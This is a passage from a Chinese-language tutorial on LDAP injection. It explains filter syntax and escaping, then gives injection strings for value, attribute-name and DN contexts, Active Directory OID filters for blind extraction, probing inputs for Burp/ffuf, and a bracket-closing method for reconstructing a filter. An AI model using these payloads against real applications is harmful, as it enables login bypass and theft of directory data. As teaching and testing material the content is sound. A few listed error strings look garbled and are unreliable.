## 一、LDAP协议与过滤器语义深度

### 1.1 LDAP架构基础
```
目录树结构：dc=example,dc=com（根）→ ou=people（组织单元）→ cn=admin（条目）
条目（Entry）= 属性（Attribute）集合，属性由 OID 引用
DN 示例：CN=James Bond,OU=Users,DC=corp,DC=local
RDN 示例：CN=James Bond（DN中最左的组分）
作用域（Scope）：base（仅基DN）/ one（直接子级）/ sub（全部子树）
```

### 1.2 RFC 4515 过滤器语法精讲

**过滤器是前缀（波兰）记法**，与SQL的中缀语法不同，注入时需要精确闭合括号：

```
(attr=value)                 等于/存在（value为*时是存在性测试）
(&(a=1)(b=2))                AND（集合，至少1个元素）
(|(a=1)(b=2))                OR（集合，至少1个元素）
(!(a=1))                     NOT（恰1个元素）
(attr>=value)                大于等于（按匹配规则排序）
(attr<=value)                小于等于
(attr~=value)                近似匹配（实现相关，AD支持有限）
(attr=*value*)               子串匹配（可混合：*a*b*）
(attr:oid:=value)            OID扩展匹配（AD位掩码/递归成员的关键语法）
```

**RFC 4515 转义规则（关键——注入与防护都围绕它）：**
过滤器值中必须对以下字符转义，转义形式为`\`+十六进制：
```
\ → \5c
* → \2a
( → \28
) → \29
NUL → \00
```
**未列入转义集**的`& | ! = < > ~`等在等号右侧（值上下文）无需转义——但若攻击者把输入放在属性名/结构位置（如括号外），它们就变成逻辑运算符。**这就是"转义了却仍然可注入"的经典根因**：开发者只转义了部分场景，或把过滤器转义函数用在了DN上（或反之）。

**匹配规则（大小写敏感性差异）——盲注设计必须知道：**
| 匹配规则 | 属性示例 | 大小写 |
|---------|---------|--------|
| caseIgnoreMatch | cn、sn、mail、sAMAccountName | 不敏感 |
| caseExactMatch | uid（OpenLDAP默认） | 敏感 |
| caseExactIA5Match | userPrincipalName、url | 敏感 |
| octetStringMatch | userPassword、objectSid | 按字节 |

### 1.3 过滤器类型混淆与解析差异

**（1）值/结构上下文混淆：** 同一输入进入不同拼接位置产生不同漏洞类型：
```
# 值上下文（等号右侧）→ 注入元字符闭合再扩展
filter = "(&(uid=" + user + ")(userPassword=" + pass + "))"
输入 user = *)(|(uid=*   → 闭合 (uid= 后注入OR

# 属性名上下文 → 可注入OID扩展/替换属性
filter = "(" + attr + "=" + val + ")"
输入 attr = uid)(|(objectClass=*   → 直接改写整个过滤器结构

# DN上下文 → 需按RFC 4514转义，逗号/加号是分隔符
base = "ou=" + input + ",dc=corp,dc=local"
输入 input = people,dc=evil,dc=com   → 基DN逃逸
```

**（2）OID扩展匹配的类型混淆（AD特有，盲注利器）：**
```
# 普通属性比较
(sAMAccountName=admin)
# 换成位掩码OID → 语义从"等于"变为"按位与"：
(userAccountControl:1.2.840.113556.1.4.803:=2)   # 值第2位为1（禁用账户）
(userAccountControl:1.2.840.113556.1.4.803:=65536) # 值第17位为1（DONT_EXPIRE_PASSWORD）
# 换成递归匹配OID → 深度组成员：
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)
# 换成排序OID → 按字节序比较（OID 2.5.13.18，见第五章5.3位运算提取）
(userPassword:2.5.13.18:=\64\00\01\02...)
```

**（3）实现差异：** 同一过滤器在不同服务器上解析结果不同（RFC实现偏差）：
- AD对`(attr=*)`存在性测试、空值、超长过滤器的容错与OpenLDAP不同
- OpenLDAP有`sizeLimit/timeLimit`，AD有`MaxPageSize`（默认1000/2000），影响枚举上限
- 某些服务器对尾随未闭合括号的容错度不同（`(&(uid=admin)(|(password=x)`可被部分实现容忍）——**模糊测试时按"畸形→半闭合→完整闭合"梯度递进**

### 1.4 注入点识别与过滤器结构推断

**识别注入点的特征请求（Burp/ffuf）:**
```
# 1. 提交包含LDAP元字符的输入，观察响应差异/错误
user=*            → 若返回用户或不同错误 → 存在通配符注入
user=)(&(1=1))    → 若报错信息含filter语法 → 确认后端LDAP
user=admin%00     → 老版本C实现截断测试

# 2. 错误信息泄露（LDAP错误码会回显结构）
# 返回类似 "Bad search filter"、"protocol error"、"AILTER" → LDAP后端
# AD错误：0x51（服务器忙）/0x52（不可用）/0x10（LDAP_NO_SUCH_OBJECT）→ 可推断基DN
```

**结构推断方法（类比SQL注入的字段数探测）：**
```
# 原过滤器假设：(&(uid=INPUT)(userPassword=xxx))
# 用闭合数递增法推断括号深度：
INPUT=*                → 匹配任何用户 → 确认至少有一层括号
INPUT=*)(             → 语法错误 → 确认闭合后仍有后续条件
INPUT=*)(|(cn=*))     → 若成功 → 确认结构为 (&(uid=*)(|(cn=*))(userPassword=xxx))
# 直到成功闭合所有括号即还原出完整过滤器模板
```

